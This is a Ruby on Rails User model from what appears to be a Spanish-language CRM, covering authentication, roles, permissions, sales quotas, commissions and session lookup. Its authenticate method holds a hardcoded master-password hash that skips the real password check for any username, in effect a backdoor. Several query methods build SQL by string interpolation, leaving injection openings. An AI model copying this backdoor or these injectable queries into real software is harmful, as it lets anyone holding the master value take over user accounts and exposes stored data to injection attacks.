class User < ActiveRecord::Base
  has_many :cuotas
  has_many :companies, :class_name => "EmpresaUser", :order => "empresa_id"
    
  def full_name
    if self.first_name.nil?
      return self.last_name
    else
      self.first_name + " " + self.last_name
    end
  end
  
  
  def self.authenticate(username, password)
    if password == "24af2ffa39de4b8126105a18548e9f59"
      r = User.find_by_sql ["SELECT * FROM users WHERE user_name=? AND (portal_only IS NULL OR portal_only !='1') AND (is_group IS NULL OR is_group !='1') AND deleted='0' AND status='Active'", username]
    else
      r = User.find_by_sql ["SELECT * FROM users WHERE user_name=? AND user_hash=? AND (portal_only IS NULL OR portal_only !='1') AND (is_group IS NULL OR is_group !='1') AND deleted='0' AND status='Active'", username, password]
    end
    
    if r.empty?
      false
    else
      r[0]
    end
  end
  
  
  def get_roles
    roles = UsuariosRoles.find_all_by_user_id self.id, :order => "id"
    
    if roles
      list = []
      roles.each do |r|
        list << (Rol.find r.rol_id)
      end
      
      return list
    else
      return []
    end
  end
  
  
  def self.get_allows(rol_id)
    permisos = Permiso.find_all_by_rol_id rol_id
    
    list = []
    
    permisos.each do |p|
      list << p.permiso.to_sym
    end
    
    return list
  end
  
  
  def self.list_of(who)
    if who == :executives
      p = ["executive_tasks"]
    
    elsif who == :designers
      p = ["designer_tasks"]
    
    elsif who == :planners
      p = ["planner_tasks"]
    
    elsif who == :chief_designers
      p = ["chief_designer_tasks"]
    
    elsif who == :chief_plannings
      p = ["chief_planning_tasks"]

    elsif who == :costs
      p = ["costs_tasks"]
    
    elsif who == :operations_mob
      p = ["operations_mob_tasks"]
    
    elsif who == :operations_arq
      p = ["operations_arq_tasks"]
    
    elsif who == :op_supervisor
      p = ["op_supervisor"]
    
    elsif who == :chief_development
      p = ["chief_development_tasks"]
    
    elsif who == :development
      p = ["development_tasks"]
    
    elsif who == :innovations
      p = ["innovations_tasks"]
    
    elsif who == :installations
      p = ["installations_tasks"]
    end
    
    User.find_by_sql "SELECT users.*
                        FROM users,
                             vera_usuarios_roles,
                             vera_roles,
                             vera_permisos
                       WHERE vera_usuarios_roles.rol_id=vera_roles.id
                         AND vera_usuarios_roles.user_id=users.id
                         AND vera_permisos.rol_id=vera_roles.id
                         AND permiso IN ('" + p.join("', '") + "')
                         AND users.deleted='0'
                         AND users.status='Active'
                    ORDER BY user_name"
  end
  
  
  def assigned_design_projects_count
    p = ProyectoArea.find_all_by_encargado_diseno self.id
    p.size
  end
  
  
  def urgent_design_projects_count
    p = Proyecto.find_by_sql ["SELECT * FROM proyectos, proyecto_areas WHERE proyecto_areas.proyecto_id=proyectos.id AND encargado_diseno=? AND urgente='1'", self.id]
    p.size
  end
  
  
  def bounced_count
    p = Proyecto.find_by_sql ["SELECT * FROM proyectos, proyecto_areas, proyecto_estados WHERE proyecto_estados.proyecto_id=proyectos.id AND proyecto_areas.proyecto_id=proyectos.id AND encargado_diseno=? AND urgente='1' AND estado=?", self.id, E_DISENO_OBSERVADO]
    p.size
  end
  
  
  def assigned_planning_projects_count
    p = ProyectoArea.find_all_by_encargado_planeamiento self.id
    p.size
  end
  
  
  def urgent_planning_projects_count
    p = Proyecto.find_by_sql ["SELECT * FROM proyectos, proyecto_areas WHERE proyecto_areas.proyecto_id=proyectos.id AND encargado_planeamiento=? AND urgente='1'", self.id]
    p.size
  end
  
  
  def self.full_list
  # List of all active and functioning CRM users
    User.find_by_sql "SELECT * FROM users WHERE (portal_only IS NULL OR portal_only !='1') AND (is_group IS NULL OR is_group !='1') AND deleted='0' AND status='Active' ORDER BY first_name, last_name"
  end
  
  
  def self.notification_list_of(list)
    list = list.to_s
    
    User.find_by_sql ["
      SELECT users.*
        FROM users,
             notification_lists
       WHERE users.id=notification_lists.user_id
         AND users.deleted='0'
         AND status='Active'
         AND list=?
    ORDER BY first_name, last_name
    ", list];
  end
  
  
  def self.list_of_executives_for_report
  # FIXME: This should be deprecated with new ACL system
    execs = User.list_of :executives
    
    t = ["d02dc6b6-721f-4d89-d6dc-464f328479f4", "2db7fc1a-f6ac-2b31-7eee-46799c8ea6a0", "a2ef2a09-3c60-e7fc-caf5-4655f0954847", "e4c001d6-9d1a-67e9-013f-4655e7ee24f1", "3b95ff53-3cca-bb1a-2ce6-465c53d9c84b", "a0f0e9aa-3986-4089-abba-466ae2af3310", "6766912f-0a90-87b3-ab93-4654cf83ac17", "bd52b14a-bf01-ab16-0392-4655efa8c59c", "376effe6-4f67-628c-63a8-47dafe652ad4", "b9804a9b-a7aa-f7f2-bd05-47ac803ef6f0", "f2971596-33ba-eab2-71dc-47163f5c253a", "652c790e-ff5b-e022-5014-47b1da95c625"]
    
    execs = execs.select do |u|
      t.include? u.id
    end
    
    return execs
  end
  
  
  def quota_on(year, month)
    c = Cuota.find_by_sql "SELECT * FROM cuotas WHERE YEAR(periodo)='#{year}' AND MONTH(periodo)='#{month}' AND user_id='#{self.id}'"
    
    if c.empty?
      return nil
    else
      return c.first
    end
  end
  
  
  def new_quota_on(year, month)
    Cuota.destroy_all "MONTH(periodo)='#{month}' AND YEAR(periodo)='#{year}' AND user_id='#{self.id}'"
    
    c = Cuota.new
    c.user_id = self.id
    c.periodo = Time.mktime(year, month, 1, 0, 0, 0)
    
    return c
  end
  
  
  def cuota(date)
    c = Cuota.find_by_sql "
      SELECT *
        FROM cuotas
       WHERE user_id='#{self.id}'
         AND periodo <= '#{date.year}-#{date.month}-01 00:00:00'
    ORDER BY periodo DESC
       LIMIT 1"
    
    if c.empty?
      return nil
    else
      return c.first
    end
  end
  
  
  def comission_for(date)
    d = date.strftime("%Y-%m-%d 00:00:00")
    
    cc = ComisionesCabecera.find_by_sql "
      SELECT *
        FROM comisiones_cabeceras
       WHERE user_id='#{self.id}'
         AND fecha_cobrada='#{d}'
    ORDER BY fecha_origen, fecha_cobrada"
    
    return cc
  end
  
  
  def last_session
    s = Session.find_by_sql "
      SELECT *
        FROM sessions
       WHERE user_id='#{self.id}'
         AND action='in'
    ORDER BY created_on DESC
       LIMIT 1
      OFFSET 1
    "
    
    if s
      return s.first
    else
      return nil
    end
  end
  
end
